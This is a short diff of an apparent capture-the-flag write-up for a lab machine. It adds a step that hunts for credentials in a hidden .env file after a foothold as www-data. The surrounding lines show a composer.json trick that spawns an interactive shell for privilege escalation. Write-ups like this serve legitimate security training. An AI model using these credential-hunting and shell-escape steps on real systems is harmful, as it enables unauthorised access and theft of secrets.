@@ -51,6 +51,8 @@ Now we are in the system as www-data
 
 User1
 ------------
+Using the recursive grep command in the web-app directory to find some passwords didn't give any results, but there are some hidden files in directory so we can check it and find some password in .env file
+![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/env%20pas.PNG)
 
 TF=$(mktemp -d)
 echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
